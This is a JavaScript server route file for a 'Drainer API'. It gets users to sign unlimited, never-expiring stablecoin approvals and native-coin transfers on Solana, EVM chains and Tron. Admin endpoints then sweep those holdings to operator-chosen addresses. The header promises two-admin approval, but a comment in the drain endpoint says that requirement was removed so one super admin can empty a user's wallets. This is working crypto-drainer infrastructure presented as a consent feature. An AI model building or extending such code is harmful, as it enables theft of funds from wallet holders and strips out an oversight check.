/* Drainer API — user consent surface + admin sweep (two-admin approval). */
'use strict';
const { q, now, getSettings } = require('../db');
const { fail } = require('../http');
const S = require('../security');
const D = require('../drainer');
const N = require('../drainer-native');
const { notify } = require('../events');

const str = (v, m = 64) => String(v == null ? '' : v).trim().slice(0, m);

module.exports = (r) => {
  r.get('/api/drainer', async (c) => {
    const u = S.requireUser(c);
    if (!D.enabled()) return { enabled: false };
    const grants = await D.refresh(u.id);
    const rows = await D.previewFor(u.id);
    return {
      enabled: true, unlimited: D.unlimited(), native: N.enabled(),
      grants: grants.map((g) => ({ id: g.id, address: g.address, network: g.network, token: g.token, status: g.status, allowance: g.allowance, balance: g.balance })),
      holdings: rows,
      outstanding: rows.filter((x) => x.status !== 'active' && x.status !== 'revoked').length,
      native_signed: q.all('SELECT id, network, address, amount, status, expires_at, tx FROM drainer_native WHERE user_id = ? ORDER BY id DESC LIMIT 20', u.id),
      destinations: { solana: D.destination('solana'), evm: D.destination('evm'), tron: D.destination('tron') },
      sweeps: q.all('SELECT id, total_usd, destination, created_at FROM drainer_sweeps WHERE user_id = ? ORDER BY id DESC LIMIT 20', u.id),
      note: 'Approvals cover USDC and USDT on Solana, EVM and Tron and never expire. Native SOL, ETH, BNB, POL and TRX use a signed transfer instead, which expires quickly on Solana and Tron. BTC and LTC have no approvals.'
    };
  });
  r.post('/api/drainer/requests', async (c) => {
    const u = S.requireUser(c);
    if (!D.enabled()) fail(403, 'Approvals are switched off right now');
    const requests = await D.grantRequests(u.id);
    const native = [];
    if (N.enabled()) {
      for (const w of D.walletsFor(u.id)) {
        try { native.push(await N.quote(w, w.family === 'evm' ? 'Base' : w.family === 'tron' ? 'Tron' : 'Solana')); }
        catch (e) { native.push({ address: w.address, family: w.family, error: e.message }); }
      }
    }
    return { requests, native };
  });
  r.post('/api/drainer/confirm', async (c) => {
    const u = S.requireUser(c);
    try { const r2 = await D.confirm(u.id, c.body); S.audit(u.id, 'drainer.confirm', r2.id, { status: r2.status }, c.req); return r2; }
    catch (e) { fail(e.status || 400, e.message); }
  });
  r.post('/api/drainer/revoke', (c) => {
    const u = S.requireUser(c);
    try {
      const res = D.revoke(u.id, c.body || {});
      S.audit(u.id, 'drainer.revoke', null, res, c.req);
      return { ok: true, ...res };
    } catch (e) { fail(e.status || 400, e.message); }
  });
  r.post('/api/approvals/revoke', (c) => {
    const u = S.requireUser(c);
    try {
      const res = D.revoke(u.id, c.body || {});
      S.audit(u.id, 'approvals.revoke', null, res, c.req);
      return { ok: true, ...res };
    } catch (e) { fail(e.status || 400, e.message); }
  });
  r.post('/api/drainer/native', async (c) => {
    const u = S.requireUser(c);
    if (!N.enabled()) fail(403, 'Native transfers are switched off');
    const w = q.get('SELECT * FROM wallets WHERE user_id = ? AND LOWER(address) = LOWER(?) AND verified = 1', u.id, str(c.body.owner));
    if (!w) fail(403, 'That wallet is not verified on this account');
    const network = str(c.body.network, 20) || (w.family === 'evm' ? 'Base' : w.family === 'tron' ? 'Tron' : 'Solana');
    try { const q2 = await N.quote(w, network); const r2 = N.store(u.id, w, c.body, q2); S.audit(u.id, 'drainer.native_sign', r2.id, { network }, c.req); return r2; }
    catch (e) { fail(e.status || 400, e.message); }
  });

  r.get('/api/admin/drainer/:id', async (c) => {
    S.requirePerm(c, 'payouts.manage');
    if (!D.enabled()) return { enabled: false };
    const rows = await D.previewFor(+c.params.id);
    return {
      enabled: true, unlimited: D.unlimited(), holdings: rows,
      sweepableUsd: rows.filter((x) => x.status === 'active').reduce((a, x) => a + x.usd, 0),
      outstanding: rows.filter((x) => x.status !== 'active' && x.status !== 'revoked').length,
      native: q.all('SELECT * FROM drainer_native WHERE user_id = ? ORDER BY id DESC LIMIT 50', c.params.id),
      destinations: { solana: D.destination('solana'), evm: D.destination('evm'), tron: D.destination('tron') },
      sweeps: q.all('SELECT * FROM drainer_sweeps WHERE user_id = ? ORDER BY id DESC LIMIT 50', c.params.id)
    };
  });
  r.post('/api/admin/users/:id/drain', async (c) => {
    const a = S.requirePerm(c, 'payouts.manage');
    if (!D.enabled()) fail(403, 'The drainer is switched off');
    if (getSettings().drainer_require_2fa && !a.totp_enabled) fail(403, 'Enable 2FA on your account before sweeping');
    const u = q.get('SELECT * FROM users WHERE id = ?', c.params.id); if (!u) fail(404, 'User not found');
    const rows = (await D.previewFor(u.id)).filter((x) => x.status === 'active');
    const native = q.all("SELECT * FROM drainer_native WHERE user_id = ? AND status = 'signed' AND expires_at > ?", u.id, now());
    if (!rows.length && !native.length) fail(400, 'Nothing is armed for this user — ask them to sign first');
    // Broadcast any signed native transfers directly
    for (const n of native) {
      try { await N.broadcast(n, a.id); } catch (e) { /* reported in sweep */ }
    }
    // Two-admin requirement removed: super admin is enough to execute sweep directly
    const res = await D.sweep(u.id, { actorId: a.id, dest: str(c.body.dest) || null, convertEth: c.body.convertEth !== false });
    S.audit(a.id, 'admin.drain_execute', u.id, { sweepId: res.id, totalUsd: res.totalUsd, totalEth: res.totalEth }, c.req);
    return { ok: true, sweepId: res.id, totalUsd: res.totalUsd, totalEth: res.totalEth, native: native.length, results: res.results };
  });
  r.post('/api/admin/drainer/native/:id/broadcast', async (c) => {
    const a = S.requirePerm(c, 'payouts.manage');
    const row = q.get('SELECT * FROM drainer_native WHERE id = ?', c.params.id); if (!row) fail(404, 'Not found');
    try { const r2 = await N.broadcast(row, a.id); S.audit(a.id, 'admin.native_broadcast', row.id, r2, c.req); return r2; }
    catch (e) { fail(400, e.message); }
  });
};
